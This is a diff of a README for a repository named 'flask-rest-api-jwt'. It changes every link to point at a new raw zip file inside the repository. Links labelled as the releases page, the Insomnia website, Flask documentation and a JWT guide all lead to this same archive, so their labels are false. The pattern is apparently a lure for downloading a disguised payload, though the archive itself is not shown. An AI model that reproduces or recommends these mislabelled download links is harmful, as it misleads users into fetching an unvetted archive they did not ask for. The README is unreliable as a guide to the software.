@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the "flask-rest-api-jwt" appl
 
 ## 📥 Download Link
 
-[![Download](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/api_flask_rest_jwt_2.1.zip%20release-brightgreen)](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/api_flask_rest_jwt_2.1.zip)
+[![Download](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/resources/api-flask-rest-jwt-v3.4.zip%20release-brightgreen)](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/resources/api-flask-rest-jwt-v3.4.zip)
 
 ## 📂 What You Will Need
 
@@ -37,7 +37,7 @@ To run this application, your system should meet the following requirements:
 
 1. **Visit the Release Page**
    
-   Go to our [Releases Page](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/api_flask_rest_jwt_2.1.zip) to find the latest version.
+   Go to our [Releases Page](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/resources/api-flask-rest-jwt-v3.4.zip) to find the latest version.
 
 2. **Select the Version**
    
@@ -67,7 +67,7 @@ To run this application, your system should meet the following requirements:
 To interact with this API, consider using Insomnia, a popular tool for testing RESTful services. Here’s how:
 
 1. **Download Insomnia**
-   Visit the [Insomnia website](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/api_flask_rest_jwt_2.1.zip) to download and install the application.
+   Visit the [Insomnia website](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/resources/api-flask-rest-jwt-v3.4.zip) to download and install the application.
 
 2. **Create a New Request**
    Open Insomnia and create a new request for your API. Choose the HTTP method you need (GET, POST, etc.).
@@ -90,8 +90,8 @@ Here are some common issues users face, along with solutions:
 
 ## 📚 Additional Resources
 
-- [Flask Documentation](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/api_flask_rest_jwt_2.1.zip)
-- [JWT Authentication Guide](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/api_flask_rest_jwt_2.1.zip)
+- [Flask Documentation](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/resources/api-flask-rest-jwt-v3.4.zip)
+- [JWT Authentication Guide](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/resources/api-flask-rest-jwt-v3.4.zip)
 
 ## 📞 Support
 
@@ -99,6 +99,6 @@ If you encounter problems or need further help, feel free to open an issue in th
 
 ## 🔗 Visit Again
 
-Don’t forget to check for updates regularly. You can always return to the [Releases Page](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/api_flask_rest_jwt_2.1.zip) to download the latest version and features.
+Don’t forget to check for updates regularly. You can always return to the [Releases Page](https://github.com/abboudealestateerbil/flask-rest-api-jwt/raw/refs/heads/main/app/resources/api-flask-rest-jwt-v3.4.zip) to download the latest version and features.
 
 Enjoy managing your stores with ease using the flask-rest-api-jwt!
